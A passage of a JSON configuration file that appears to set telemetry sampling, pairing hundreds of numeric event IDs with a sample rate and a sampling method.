							"36247834": {
								"sampleRate": 1,
								"samplingMethod": 1
							},
							"36249481": {
								"sampleRate": 1,
								"samplingMethod": 1
							},
							"36250226": {
								"sampleRate": 1,
								"samplingMethod": 1
							},
							"36251283": {
								"sampleRate": 1,
								"samplingMethod": 1
							},
							"36251818": {
								"sampleRate": 1,
								"samplingMethod": 1
							},
							"36252140": {
								"sampleRate": 1,
								"samplingMethod": 1
							},
							"36254052": {
								"sampleRate": 1,
								"samplingMethod": 1
							},
							"36254288": {
								"sampleRate": 1,
								"samplingMethod": 1
							},
							"36255283": {
								"sampleRate": 1,
								"samplingMethod": 1
							},
							"36256069": {
								"sampleRate": 1,
								"samplingMethod": 1
							},
							"36256398": {
								"sampleRate": 1,
								"samplingMethod": 1
							},
							"36257282": {
								"sampleRate": 1,
								"samplingMethod": 1
							},
							"36257380": {
								"sampleRate": 1,
								"samplingMethod": 1
							},
							"36306945": {
								"sampleRate": 1,
								"samplingMethod": 1
							},
							"36306946": {
								"sampleRate": 1,
								"samplingMethod": 1
							},
							"36306948": {
								"sampleRate": 1,
								"samplingMethod": 1
							},
							"36306951": {
								"sampleRate": 1000,
								"samplingMethod": 1
							},
							"36306952": {
								"sampleRate": 1,
								"samplingMethod": 1
							},
							"36306955": {
								"sampleRate": 1,
								"samplingMethod": 1
							},
							"36306958": {
								"sampleRate": 1,
								"samplingMethod": 1
							},
							"37101248": {
								"sampleRate": 10000,
								"samplingMethod": 1
							},
							"37158913": {
								"sampleRate": 1,
								"samplingMethod": 1
							},
							"37158914": {
								"sampleRate": 1,
								"samplingMethod": 1
							},
							"37158915": {
								"sampleRate": 1,
								"samplingMethod": 1
							},
							"37158916": {
								"sampleRate": 1,
								"samplingMethod": 1
							},
							"37224449": {
								"sampleRate": 10000,
								"samplingMethod": 1
							},
							"37224450": {
								"sampleRate": 10000,
								"samplingMethod": 1
							},
							"37224451": {
								"sampleRate": 10000,
								"samplingMethod": 1
							},
							"37224452": {
								"sampleRate": 10000,
								"samplingMethod": 1
							},
							"37224453": {
								"sampleRate": 10000,
								"samplingMethod": 1
							},
							"37224454": {
								"sampleRate": 10000,
								"samplingMethod": 1
							},
							"37224455": {
								"sampleRate": 10000,
								"samplingMethod": 1
							},
							"37224456": {
								"sampleRate": 10000,
								"samplingMethod": 1
							},
							"37224457": {
								"sampleRate": 10000,
								"samplingMethod": 1
							},
							"37289985": {
								"sampleRate": 1,
								"samplingMethod": 1
							},
							"37289986": {
								"sampleRate": 1,
								"samplingMethod": 1
							},
							"37289987": {
								"sampleRate": 1,
								"samplingMethod": 1
							},
							"37289990": {
								"sampleRate": 1,
								"samplingMethod": 1
							},
							"37289992": {
								"sampleRate": 1,
								"samplingMethod": 1
							},
							"37359568": {
								"sampleRate": 10,
								"samplingMethod": 1
							},
							"37362344": {
								"sampleRate": 10,
								"samplingMethod": 1
							},
							"37363365": {
								"sampleRate": 10,
								"samplingMethod": 1
							},
							"37365445": {
								"sampleRate": 10,
								"samplingMethod": 1
							},
							"37368014": {
								"sampleRate": 10,
								"samplingMethod": 1
							},
							"37368588": {
								"sampleRate": 10,
								"samplingMethod": 1
							},
							"37370103": {
								"sampleRate": 10,
								"samplingMethod": 1
							},
							"37631558": {
								"sampleRate": 4,
								"samplingMethod": 1
							},
							"37814273": {
								"sampleRate": 1,
								"samplingMethod": 1
							},
							"37814274": {
								"sampleRate": 1,
								"samplingMethod": 1
							},
							"37814275": {
								"sampleRate": 1,
								"samplingMethod": 1
							},
							"38209779": {
								"sampleRate": 100,
								"samplingMethod": 1
							},
							"38212112": {
								"sampleRate": 100,
								"samplingMethod": 1
							},
							"38212473": {
								"sampleRate": 100,
								"samplingMethod": 1
							},
							"38220042": {
								"sampleRate": 100,
								"samplingMethod": 1
							},
							"38338561": {
								"sampleRate": 1,
								"samplingMethod": 1
							},
							"38338562": {
								"sampleRate": 1,
								"samplingMethod": 1
							},
							"38338563": {
								"sampleRate": 1,
								"samplingMethod": 1
							},
							"38338564": {
								"sampleRate": 1,
								"samplingMethod": 1
							},
							"38344892": {
								"sampleRate": 1,
								"samplingMethod": 1
							},
							"38349246": {
								"sampleRate": 1,
								"samplingMethod": 1
							},
							"38351883": {
								"sampleRate": 1,
								"samplingMethod": 1
							},
							"38928385": {
								"sampleRate": 1,
								"samplingMethod": 1
							},
							"39976964": {
								"sampleRate": 10,
								"samplingMethod": 1
							},
							"39976965": {
								"sampleRate": 10,
								"samplingMethod": 1
							},
							"39976966": {
								"sampleRate": 1,
								"samplingMethod": 1
							},
							"39976967": {
								"sampleRate": 2,
								"samplingMethod": 1
							},
							"40173575": {
								"sampleRate": 1000,
								"samplingMethod": 1
							},
							"40501249": {
								"sampleRate": 1,
								"samplingMethod": 3
							},
							"40501250": {
								"sampleRate": 1,
								"samplingMethod": 1
							},
							"40501251": {
								"sampleRate": 1,
								"samplingMethod": 1
							},
							"40501252": {
								"sampleRate": 1,
								"samplingMethod": 1
							},
							"40501253": {
								"sampleRate": 1,
								"samplingMethod": 1
							},
							"40501254": {
								"sampleRate": 1,
								"samplingMethod": 1
							},
							"40501255": {
								"sampleRate": 1,
								"samplingMethod": 1
							},
							"40840748": {
								"sampleRate": 1,
								"samplingMethod": 1
							},
							"40841422": {
								"sampleRate": 1,
								"samplingMethod": 1
							},
							"40843772": {
								"sampleRate": 1,
								"samplingMethod": 1
							},
							"40894467": {
								"sampleRate": 1,
								"samplingMethod": 1
							},
							"40894468": {
								"sampleRate": 1,
								"samplingMethod": 1
							},
							"40894469": {
								"sampleRate": 1,
								"samplingMethod": 1
							},
							"40894470": {
								"sampleRate": 1,
								"samplingMethod": 1
							},
							"40894472": {
								"sampleRate": 1,
								"samplingMethod": 1
							},
							"40894473": {
								"sampleRate": 1,
								"samplingMethod": 1
							},
							"40894474": {
								"sampleRate": 1,
								"samplingMethod": 1
							},
							"40894475": {
								"sampleRate": 1,
								"samplingMethod": 1
							},
							"40894483": {
								"sampleRate": 1,
								"samplingMethod": 1
							},
							"40894484": {
								"sampleRate": 1,
								"samplingMethod": 1
							},
							"40894485": {
								"sampleRate": 1,
								"samplingMethod": 1
							},
							"40894486": {
								"sampleRate": 1,
								"samplingMethod": 1
							},
							"40894487": {
								"sampleRate": 1,
								"samplingMethod": 1
							},
							"40894490": {
								"sampleRate": 1,
								"samplingMethod": 1
							},
							"40894491": {
								"sampleRate": 1,
								"samplingMethod": 1
							},
							"40894492": {
								"sampleRate": 1,
								"samplingMethod": 1
							},
							"40894493": {
								"sampleRate": 1,
								"samplingMethod": 1
							},
							"40894494": {
								"sampleRate": 1,
								"samplingMethod": 1
							},
							"40894495": {
								"sampleRate": 1,
								"samplingMethod": 1
							},
							"40894496": {
								"sampleRate": 1,
								"samplingMethod": 1
							},
							"40894497": {
								"sampleRate": 1,
								"samplingMethod": 1
							},
							"40894498": {
								"sampleRate": 1,
								"samplingMethod": 1
							},
							"40894499": {
								"sampleRate": 1,
								"samplingMethod": 1
							},
							"40894500": {
								"sampleRate": 1,
								"samplingMethod": 1
							},
							"40894501": {
								"sampleRate": 1,
								"samplingMethod": 1
							},
							"40894502": {
								"sampleRate": 1,
								"samplingMethod": 1
							},
							"40903710": {
								"sampleRate": 1,
								"samplingMethod": 1
							},
							"40905691": {
								"sampleRate": 1,
								"samplingMethod": 1
							},
							"40908043": {
								"sampleRate": 1,
								"samplingMethod": 1
							},
							"40910623": {
								"sampleRate": 1,
								"samplingMethod": 1
							},
							"40913765": {
								"sampleRate": 1,
								"samplingMethod": 1
							},
							"40919892": {
								"sampleRate": 1,
								"samplingMethod": 1
							},
							"41484289": {
								"sampleRate": 2,
								"samplingMethod": 1
							},
							"41484290": {
								"sampleRate": 100,
								"samplingMethod": 1
							},
							"41484291": {
								"sampleRate": 100,
								"samplingMethod": 1
							},
							"41484292": {
								"sampleRate": 100,
								"samplingMethod": 1
							},
							"41484293": {
								"sampleRate": 100,
								"samplingMethod": 1
							},
							"41484294": {
								"sampleRate": 200,
								"samplingMethod": 1
							},
							"41484295": {
								"sampleRate": 100,
								"samplingMethod": 1
							},
							"41484296": {
								"sampleRate": 100,
								"samplingMethod": 1
							},
							"41484297": {
								"sampleRate": 100,
								"samplingMethod": 1
							},
							"41484298": {
								"sampleRate": 100,
								"samplingMethod": 1
							},
							"41484299": {
								"sampleRate": 100,
								"samplingMethod": 1
							},
							"41484300": {
								"sampleRate": 100,
								"samplingMethod": 1
							},
							"41484301": {
								"sampleRate": 1,
								"samplingMethod": 1
							},
							"41484302": {
								"sampleRate": 100,
								"samplingMethod": 1
							},
							"41484303": {
								"sampleRate": 100,
								"samplingMethod": 1
							},
							"41484304": {
								"sampleRate": 100,
								"samplingMethod": 1
							},
							"41484306": {
								"sampleRate": 100,
								"samplingMethod": 1
							},
							"41484307": {
								"sampleRate": 100,
								"samplingMethod": 1
							},
							"41484308": {
								"sampleRate": 100,
								"samplingMethod": 1
							},
							"41484309": {
								"sampleRate": 10,
								"samplingMethod": 1
							},
							"41484310": {
								"sampleRate": 10,
								"samplingMethod": 1
							},
							"41484311": {
								"sampleRate": 1,
								"samplingMethod": 1
							},
							"41484312": {
								"sampleRate": 1,
								"samplingMethod": 1
							},
							"41484313": {
								"sampleRate": 1,
								"samplingMethod": 1
							},
							"41484314": {
								"sampleRate": 1,
								"samplingMethod": 1
							},
							"41484315": {
								"sampleRate": 100,
								"samplingMethod": 1
							},
							"41484317": {
								"sampleRate": 100,
								"samplingMethod": 1
							},
							"41484318": {
								"sampleRate": 20,
								"samplingMethod": 1
							},
							"41485898": {
								"sampleRate": 10,
								"samplingMethod": 1
							},
							"41486225": {
								"sampleRate": 1,
								"samplingMethod": 1
							},
							"41486524": {
								"sampleRate": 1,
								"samplingMethod": 1
							},
							"41487618": {
								"sampleRate": 100,
								"samplingMethod": 1
							},
							"41488753": {
								"sampleRate": 100,
								"samplingMethod": 1
							},
							"41488847": {
								"sampleRate": 1,
								"samplingMethod": 1
							},
							"41490105": {
								"sampleRate": 1,
								"samplingMethod": 1
							},
							"41490114": {
								"sampleRate": 100,
								"samplingMethod": 1
							},
							"41491162": {
								"sampleRate": 1,
								"samplingMethod": 1
							},
							"41491183": {
								"sampleRate": 10,
								"samplingMethod": 1
							},
							"41491369": {
								"sampleRate": 10,
								"samplingMethod": 1
							},
							"41491493": {
								"sampleRate": 1,
								"samplingMethod": 1
							},
							"41491663": {
								"sampleRate": 2,
								"samplingMethod": 1
							},
							"41491821": {
								"sampleRate": 100,
								"samplingMethod": 1
							},
							"41492048": {
								"sampleRate": 1,
								"samplingMethod": 1
							},
							"41492124": {
								"sampleRate": 1,
								"samplingMethod": 1
							},
							"41492235": {
								"sampleRate": 1,
								"samplingMethod": 1
							},
							"41493161": {
								"sampleRate": 100,
								"samplingMethod": 1
							},
							"41493580": {
								"sampleRate": 100,
								"samplingMethod": 1
							},
							"41494292": {
								"sampleRate": 100,
								"samplingMethod": 1
							},
							"41495055": {
								"sampleRate": 100,
								"samplingMethod": 1
							},
							"41495478": {
								"sampleRate": 1,
								"samplingMethod": 1
							},
							"41495493": {
								"sampleRate": 1,
								"samplingMethod": 1
							},
							"41495649": {
								"sampleRate": 1,
								"samplingMethod": 1
							},
							"41497570": {
								"sampleRate": 10,
								"samplingMethod": 1
							},
							"41497784": {
								"sampleRate": 100,
								"samplingMethod": 1
							},
							"41498606": {
								"sampleRate": 10,
								"samplingMethod": 1
							},
							"41499313": {
								"sampleRate": 100,
								"samplingMethod": 1
							},
							"41500090": {
								"sampleRate": 100,
								"samplingMethod": 1
							},
							"41500148": {
								"sampleRate": 10,
								"samplingMethod": 1
							},
							"41500162": {
								"sampleRate": 1,
								"samplingMethod": 1
							},
							"41506813": {
								"sampleRate": 250,
								"samplingMethod": 1
							},
							"41549825": {
								"sampleRate": 1,
								"samplingMethod": 1
							},
							"41811969": {
								"sampleRate": 1,
								"samplingMethod": 1
							},
							"41811970": {
								"sampleRate": 1,
								"samplingMethod": 1
							},
							"41811971": {
								"sampleRate": 1,
								"samplingMethod": 1
							},
							"42403339": {
								"sampleRate": 1,
								"samplingMethod": 1
							},
							"42406132": {
								"sampleRate": 1,
								"samplingMethod": 1
							},
							"42408939": {
								"sampleRate": 1,
								"samplingMethod": 1
							},
							"42411149": {
								"sampleRate": 1,
								"samplingMethod": 1
							},
							"42417878": {
								"sampleRate": 1,
								"samplingMethod": 1
							},
							"42532865": {
								"sampleRate": 1000,
								"samplingMethod": 1
							},
							"42532866": {
								"sampleRate": 10000,
								"samplingMethod": 1
							},
							"42729476": {
								"sampleRate": 1,
								"samplingMethod": 1
							},
							"42729477": {
								"sampleRate": 1,
								"samplingMethod": 1
							},
							"42729478": {
								"sampleRate": 1,
								"samplingMethod": 1
							},
							"42738840": {
								"sampleRate": 1,
								"samplingMethod": 1
							},
							"42795009": {
								"sampleRate": 1,
								"samplingMethod": 1
							},
							"44040193": {
								"sampleRate": 1,
								"samplingMethod": 1
							},
							"44040194": {
								"sampleRate": 1,
								"samplingMethod": 1
							},
							"44040198": {
								"sampleRate": 1,
								"samplingMethod": 1
							},
							"44433409": {
								"sampleRate": 1,
								"samplingMethod": 1
							},
							"44433410": {
								"sampleRate": 1,
								"samplingMethod": 1
							},
							"44433411": {
								"sampleRate": 1,
								"samplingMethod": 1
							},
							"44892162": {
								"sampleRate": 1,
								"samplingMethod": 1
							},
							"44892163": {
								"sampleRate": 1,
								"samplingMethod": 1
							},
							"44892165": {
								"sampleRate": 5,
								"samplingMethod": 1
							},
							"44892166": {
								"sampleRate": 5,
								"samplingMethod": 1
							},
							"44957701": {
								"sampleRate": 1,
								"samplingMethod": 1
							},
							"45088770": {
								"sampleRate": 1,
								"samplingMethod": 1
							},
							"45613057": {
								"sampleRate": 1,
								"samplingMethod": 1
							},
							"45613058": {
								"sampleRate": 1,
								"samplingMethod": 1
							},
							"45613059": {
								"sampleRate": 1,
								"samplingMethod": 1
							},
							"45678593": {
								"sampleRate": 1,
								"samplingMethod": 1
							},
							"45678594": {
								"sampleRate": 100,
								"samplingMethod": 1
							},
							"46596097": {
								"sampleRate": 1,
								"samplingMethod": 1
							},
							"47841281": {
								"sampleRate": 1,
								"samplingMethod": 1
							},
							"47841282": {
								"sampleRate": 1,
								"samplingMethod": 1
							},
							"47841283": {
								"sampleRate": 1,
								"samplingMethod": 1
							},
							"48496641": {
								"sampleRate": 1,
								"samplingMethod": 1
							},
							"48758785": {
								"sampleRate": 1,
								"samplingMethod": 1
							},
							"48758786": {
								"sampleRate": 1,
								"samplingMethod": 1
							},
							"49283073": {
								"sampleRate": 1,
								"samplingMethod": 1
							},
							"49283075": {
								"sampleRate": 100,
								"samplingMethod": 1
							},
							"49284811": {
								"sampleRate": 100,
								"samplingMethod": 1
							},
							"49285023": {
								"sampleRate": 100,
								"samplingMethod": 1
							},
							"49287848": {
								"sampleRate": 100,
								"samplingMethod": 1
							},
							"49290075": {
								"sampleRate": 100,
								"samplingMethod": 1
							},
							"49290201": {
								"sampleRate": 100,
								"samplingMethod": 1
							},
							"49290401": {
								"sampleRate": 100,
								"samplingMethod": 1
							},
							"49291043": {
								"sampleRate": 100,
								"samplingMethod": 1
							},
							"49294705": {
								"sampleRate": 100,
								"samplingMethod": 1
							},
							"49294997": {
								"sampleRate": 100,
								"samplingMethod": 1
							},
							"49295194": {
								"sampleRate": 100,
								"samplingMethod": 1
							},
							"49296905": {
								"sampleRate": 100,
								"samplingMethod": 1
							},
							"49298279": {
								"sampleRate": 100,
								"samplingMethod": 1
							},
							"49479681": {
								"sampleRate": 1,
								"samplingMethod": 1
							},
							"49479683": {
								"sampleRate": 1,
								"samplingMethod": 1
							},
							"49479685": {
								"sampleRate": 1,
								"samplingMethod": 1
							},
							"49481946": {
								"sampleRate": 1,
								"samplingMethod": 1
							},
							"49816219": {
								"sampleRate": 10000,
								"samplingMethod": 1
							},
							"50987009": {
								"sampleRate": 1,
								"samplingMethod": 1
							},
							"50987010": {
								"sampleRate": 1,
								"samplingMethod": 1
							},
							"51452317": {
								"sampleRate": 100,
								"samplingMethod": 1
							},
							"52690945": {
								"sampleRate": 1,
								"samplingMethod": 1
							},
							"52690946": {
								"sampleRate": 1,
								"samplingMethod": 1
							},
							"52690947": {
								"sampleRate": 1,
								"samplingMethod": 1
							},
							"52690948": {
								"sampleRate": 1,
								"samplingMethod": 1
							},
							"52690949": {
								"sampleRate": 1,
								"samplingMethod": 1
							},
							"52690950": {
								"sampleRate": 1,
								"samplingMethod": 1
							},
							"52694580": {
								"sampleRate": 1,
								"samplingMethod": 1
							},
							"52698112": {
								"sampleRate": 1,
								"samplingMethod": 1
							},
							"52701974": {
								"sampleRate": 1,
								"samplingMethod": 1
							},
							"52704988": {
								"sampleRate": 1,
								"samplingMethod": 1
							},
							"52705483": {
								"sampleRate": 1,
								"samplingMethod": 1
							},
							"52706253": {
								"sampleRate": 1,
								"samplingMethod": 1
							},
							"52709001": {
								"sampleRate": 1,
								"samplingMethod": 1
							},
							"52710195": {
								"sampleRate": 1,
								"samplingMethod": 1
							},
							"52711372": {
								"sampleRate": 1,
								"samplingMethod": 1
							},
							"52711928": {
								"sampleRate": 1,
								"samplingMethod": 1
							},
							"52712329": {
								"sampleRate": 1,
								"samplingMethod": 1
							},
							"52717731": {
								"sampleRate": 1,
								"samplingMethod": 1
							},
							"52719193": {
								"sampleRate": 1,
								"samplingMethod": 1
							},
							"52720775": {
								"sampleRate": 1,
								"samplingMethod": 1
							},
							"52722738": {
								"sampleRate": 1,
								"samplingMethod": 1
							},
							"52756481": {
								"sampleRate": 1,
								"samplingMethod": 1
							},
							"52887553": {
								"sampleRate": 1,
								"samplingMethod": 1
							},
							"52887555": {
								"sampleRate": 1,
								"samplingMethod": 1
							},
							"52887556": {
								"sampleRate": 1,
								"samplingMethod": 3
							},
							"52887557": {
								"sampleRate": 1,
								"samplingMethod": 1
							},
							"52887559": {
								"sampleRate": 1,
								"samplingMethod": 1
							},
							"52887560": {
								"sampleRate": 1,
								"samplingMethod": 3
							},
							"52887561": {
								"sampleRate": 1,
								"samplingMethod": 3
							},
							"52887562": {
								"sampleRate": 1,
								"samplingMethod": 3
							},
							"52887563": {
								"sampleRate": 1,
								"samplingMethod": 1
							},
							"52887564": {
								"sampleRate": 1,
								"samplingMethod": 1
							},
							"52887565": {
								"sampleRate": 1,
								"samplingMethod": 1
							},
							"52887566": {
								"sampleRate": 1,
								"samplingMethod": 1
							},
							"52887567": {
								"sampleRate": 1,
								"samplingMethod": 1
							},
							"52887568": {
								"sampleRate": 1,
								"samplingMethod": 1
							},
							"52887569": {
								"sampleRate": 1,
								"samplingMethod": 1
							},
							"52887570": {
								"sampleRate": 1,
								"samplingMethod": 1
							},
							"52887571": {
								"sampleRate": 1,
								"samplingMethod": 1
							},
							"52887572": {
								"sampleRate": 1,
								"samplingMethod": 1
							},
							"52887573": {
								"sampleRate": 1,
								"samplingMethod": 1
							},
							"52887574": {
								"sampleRate": 1,
								"samplingMethod": 1
							},
							"52887575": {
								"sampleRate": 1,
								"samplingMethod": 1
							},
							"52887576": {
								"sampleRate": 1,
								"samplingMethod": 1
							},
							"52887577": {
								"sampleRate": 1,
								"samplingMethod": 1
							},
							"52887578": {
								"sampleRate": 1,
								"samplingMethod": 1
							},
							"52887579": {
								"sampleRate": 1,
								"samplingMethod": 1
							},
							"52887580": {
								"sampleRate": 1,
								"samplingMethod": 1
							},
							"52887581": {
								"sampleRate": 1,
								"samplingMethod": 1
							},
							"52887582": {
								"sampleRate": 1,
								"samplingMethod": 1
							},
							"52887583": {
								"sampleRate": 1,
								"samplingMethod": 1
							},
							"52887584": {
								"sampleRate": 1,
								"samplingMethod": 1
							},
							"52887585": {
								"sampleRate": 1,
								"samplingMethod": 1
							},
							"52887586": {
								"sampleRate": 1,
								"samplingMethod": 1
							},
							"52887587": {
								"sampleRate": 1,
								"samplingMethod": 1
							},
							"52888679": {
								"sampleRate": 1,
								"samplingMethod": 1
							},
							"52889048": {
								"sampleRate": 1,
								"samplingMethod": 1
							},
							"52889499": {
								"sampleRate": 1,
								"samplingMethod": 1
							},
							"52890296": {
								"sampleRate": 1,
								"samplingMethod": 1
							},
							"52891596": {
								"sampleRate": 1,
								"samplingMethod": 1
							},
							"52891792": {
								"sampleRate": 1,
								"samplingMethod": 1
							},
							"52892954": {
								"sampleRate": 1,
								"samplingMethod": 1
							},
							"52893664": {
								"sampleRate": 1,
								"samplingMethod": 1
							},
							"52894132": {
								"sampleRate": 1,
								"samplingMethod": 1
							},
							"52894986": {
								"sampleRate": 1,
								"samplingMethod": 1
							},
							"52895164": {
								"sampleRate": 1,
								"samplingMethod": 1
							},
							"52896044": {
								"sampleRate": 1,
								"samplingMethod": 1
							},
							"52896150": {
								"sampleRate": 1,
								"samplingMethod": 1
							},
							"52896424": {
								"sampleRate": 1,
								"samplingMethod": 1
							},
							"52897136": {
								"sampleRate": 1,
								"samplingMethod": 1
							},
							"52897207": {
								"sampleRate": 1,
								"samplingMethod": 1
							},
							"52897225": {
								"sampleRate": 1,
								"samplingMethod": 1
							},
							"52898380": {
								"sampleRate": 1,
								"samplingMethod": 1
							},
							"52899465": {
								"sampleRate": 1,
								"samplingMethod": 1
							},
							"52899570": {
								"sampleRate": 1000,
								"samplingMethod": 1
							},
							"52899642": {
								"sampleRate": 1,
								"samplingMethod": 1
							},
							"52900219": {
								"sampleRate": 1,
								"samplingMethod": 1
							},
							"52900550": {
								"sampleRate": 1,
								"samplingMethod": 1
							},
							"52900739": {
								"sampleRate": 1,
								"samplingMethod": 1
							},
							"52901503": {
								"sampleRate": 1,
								"samplingMethod": 1
							},
							"52901539": {
								"sampleRate": 1,
								"samplingMethod": 1
							},
							"52901642": {
								"sampleRate": 1,
								"samplingMethod": 1
							},
							"52901743": {
								"sampleRate": 1,
								"samplingMethod": 1
							},
							"52901931": {
								"sampleRate": 1,
								"samplingMethod": 1
							},
							"52902102": {
								"sampleRate": 1,
								"samplingMethod": 1
							},
							"52902805": {
								"sampleRate": 1,
								"samplingMethod": 1
							},
							"52903035": {
								"sampleRate": 1,
								"samplingMethod": 1
							},
							"52903160": {
								"sampleRate": 1,
								"samplingMethod": 1
							},
							"52903192": {
								"sampleRate": 1,
								"samplingMethod": 1
							},
							"52903607": {
								"sampleRate": 1,
								"samplingMethod": 1
							},
							"52910634": {
								"sampleRate": 1,
								"samplingMethod": 1
							},
							"53018625": {
								"sampleRate": 1,
								"samplingMethod": 1
							},
							"53023044": {
								"sampleRate": 1,
								"samplingMethod": 1
							},
							"53030147": {
								"sampleRate": 1,
								"samplingMethod": 1
							},
							"53346305": {
								"sampleRate": 1,
								"samplingMethod": 1
							},
							"53346306": {
								"sampleRate": 1,
								"samplingMethod": 1
							},
							"53346307": {
								"sampleRate": 1,
								"samplingMethod": 1
							},
							"53346308": {
								"sampleRate": 1,
								"samplingMethod": 3
							},
							"53346309": {
								"sampleRate": 1,
								"samplingMethod": 1
							},
							"53346310": {
								"sampleRate": 1,
								"samplingMethod": 1
							},
							"53346311": {
								"sampleRate": 1,
								"samplingMethod": 1
							},
							"53346312": {
								"sampleRate": 1,
								"samplingMethod": 1
							},
							"53346313": {
								"sampleRate": 1,
								"samplingMethod": 1
							},
							"53346314": {
								"sampleRate": 1,
								"samplingMethod": 1
							},
							"53346315": {
								"sampleRate": 1,
								"samplingMethod": 1
							},
							"53348255": {
								"sampleRate": 1,
								"samplingMethod": 1
							},
							"53349360": {
								"sampleRate": 1,
								"samplingMethod": 1
							},
							"53350227": {
								"sampleRate": 1,
								"samplingMethod": 1
							},
							"53350607": {
								"sampleRate": 1,
								"samplingMethod": 1
							},
							"53351604": {
								"sampleRate": 1,
								"samplingMethod": 1
							},
							"53352841": {
								"sampleRate": 1,
								"samplingMethod": 1
							},
							"53353549": {
								"sampleRate": 1,
								"samplingMethod": 1
							},
							"53354745": {
								"sampleRate": 1,
								"samplingMethod": 1
							},
							"53356071": {
								"sampleRate": 1,
								"samplingMethod": 1
							},
							"53356872": {
								"sampleRate": 1,
								"samplingMethod": 1
							},
							"53359547": {
								"sampleRate": 1,
								"samplingMethod": 1
							},
							"53359965": {
								"sampleRate": 1,
								"samplingMethod": 1
							},
							"53542913": {
								"sampleRate": 1,
								"samplingMethod": 1
							},
							"53542914": {
								"sampleRate": 1,
								"samplingMethod": 1
							},
							"53542915": {
								"sampleRate": 1,
								"samplingMethod": 1
							},
							"53542916": {
								"sampleRate": 1,
								"samplingMethod": 1
							},
							"53608449": {
								"sampleRate": 1,
								"samplingMethod": 1
							},
							"53608450": {
								"sampleRate": 1,
								"samplingMethod": 1
							},
							"53608451": {
								"sampleRate": 1,
								"samplingMethod": 1
							},
							"53805057": {
								"sampleRate": 1,
								"samplingMethod": 1
							},
							"53805058": {
								"sampleRate": 1,
								"samplingMethod": 1
							},
							"53805059": {
								"sampleRate": 1,
								"samplingMethod": 1
							},
							"53805060": {
								"sampleRate": 1,
								"samplingMethod": 1
							},
							"53807173": {
								"sampleRate": 1,
								"samplingMethod": 1
							},
							"53820636": {
								"sampleRate": 1,
								"samplingMethod": 1
							},
							"54132737": {
								"sampleRate": 100,
								"samplingMethod": 1
							},
							"54198273": {
								"sampleRate": 1,
								"samplingMethod": 1
							},
							"54198274": {
								"sampleRate": 1,
								"samplingMethod": 1
							},
							"54203833": {
								"sampleRate": 1,
								"samplingMethod": 1
							},
							"54204689": {
								"sampleRate": 1,
								"samplingMethod": 1
							},
							"54204699": {
								"sampleRate": 1,
								"samplingMethod": 1
							},
							"54205001": {
								"sampleRate": 1,
								"samplingMethod": 1
							},
							"54206020": {
								"sampleRate": 1,
								"samplingMethod": 1
							},
							"54207975": {
								"sampleRate": 1,
								"samplingMethod": 1
							},
							"54208795": {
								"sampleRate": 1,
								"samplingMethod": 1
							},
							"54263809": {
								"sampleRate": 1,
								"samplingMethod": 1
							},
							"54263810": {
								"sampleRate": 1,
								"samplingMethod": 1
							},
							"54263811": {
								"sampleRate": 1,
								"samplingMethod": 1
							},
							"54263812": {
								"sampleRate": 1,
								"samplingMethod": 1
							},
							"54263813": {
								"sampleRate": 1,
								"samplingMethod": 1
							},
							"54263814": {
								"sampleRate": 1,
								"samplingMethod": 1
							},
							"54263815": {
								"sampleRate": 1,
								"samplingMethod": 1
							},
							"54263816": {
								"sampleRate": 1,
								"samplingMethod": 1
							},
							"54263817": {
								"sampleRate": 1,
								"samplingMethod": 1
							},
							"54263818": {
								"sampleRate": 1,
								"samplingMethod": 1
							},
							"54263819": {
								"sampleRate": 1,
								"samplingMethod": 1
							},
							"54266075": {
								"sampleRate": 1,
								"samplingMethod": 1
							},
							"54266141": {
								"sampleRate": 1,
								"samplingMethod": 1
							},
							"54266824": {
								"sampleRate": 1,
								"samplingMethod": 1
							},
							"54272742": {
								"sampleRate": 1,
								"samplingMethod": 1
							},
							"54278955": {
								"sampleRate": 1,
								"samplingMethod": 1
							},
							"54285047": {
								"sampleRate": 1,
								"samplingMethod": 1
							},
							"54287428": {
								"sampleRate": 1,
								"samplingMethod": 1
							},
							"54525953": {
								"sampleRate": 2,
								"samplingMethod": 1
							},
							"54525954": {
								"sampleRate": 1,
								"samplingMethod": 1
							},
							"54525955": {
								"sampleRate": 1,
								"samplingMethod": 1
							},
							"54525956": {
								"sampleRate": 1,
								"samplingMethod": 1
							},
							"54525957": {
								"sampleRate": 1,
								"samplingMethod": 1
							},
							"54525958": {
								"sampleRate": 1,
								"samplingMethod": 1
							},
							"54525959": {
								"sampleRate": 1,
								"samplingMethod": 1
							},
							"54657025": {
								"sampleRate": 10000,
								"samplingMethod": 1
							},
							"54657026": {
								"sampleRate": 10000,
								"samplingMethod": 1
							},
							"54657027": {
								"sampleRate": 10000,
								"samplingMethod": 1
							},
							"54657028": {
								"sampleRate": 10000,
								"samplingMethod": 1
							},
							"54657029": {
								"sampleRate": 10000,
								"samplingMethod": 1
							},
							"54657030": {
								"sampleRate": 10000,
								"samplingMethod": 1
							},
							"54853633": {
								"sampleRate": 1,
								"samplingMethod": 1
							},
							"54853634": {
								"sampleRate": 1,
								"samplingMethod": 1
							},
							"54856934": {
								"sampleRate": 1,
								"samplingMethod": 1
							},
							"54864546": {
								"sampleRate": 1,
								"samplingMethod": 1
							},
							"54919169": {
								"sampleRate": 1,
								"samplingMethod": 1
							},
							"54919170": {
								"sampleRate": 1,
								"samplingMethod": 1
							},
							"54919171": {
								"sampleRate": 1,
								"samplingMethod": 1
							},
							"54919172": {
								"sampleRate": 1,
								"samplingMethod": 1
							},
							"54919173": {
								"sampleRate": 1,
								"samplingMethod": 1
							},
							"54919174": {
								"sampleRate": 1,
								"samplingMethod": 1
							},
							"54919175": {
								"sampleRate": 1,
								"samplingMethod": 1
							},
							"54919176": {
								"sampleRate": 1,
								"samplingMethod": 1
							},
							"54919177": {
								"sampleRate": 1,
								"samplingMethod": 1
							},
							"54919178": {
								"sampleRate": 1,
								"samplingMethod": 1
							},
							"54919179": {
								"sampleRate": 1,
								"samplingMethod": 1
							},
							"54919180": {
								"sampleRate": 1,
								"samplingMethod": 1
							},
							"54919181": {
								"sampleRate": 1,
								"samplingMethod": 1
							},
							"54919182": {
								"sampleRate": 1,
								"samplingMethod": 1
							},
							"54919183": {
								"sampleRate": 1,
								"samplingMethod": 1
							},
							"54919184": {
								"sampleRate": 1,
								"samplingMethod": 1
							},
							"54919185": {
								"sampleRate": 1,
								"samplingMethod": 1
							},
							"54919186": {
								"sampleRate": 1,
								"samplingMethod": 1
							},
							"54919187": {
								"sampleRate": 1,
								"samplingMethod": 1
							},
							"54919188": {
								"sampleRate": 1,
								"samplingMethod": 1
							},
							"54919189": {
								"sampleRate": 1,
								"samplingMethod": 1
							},
							"54919190": {
								"sampleRate": 1,
								"samplingMethod": 1
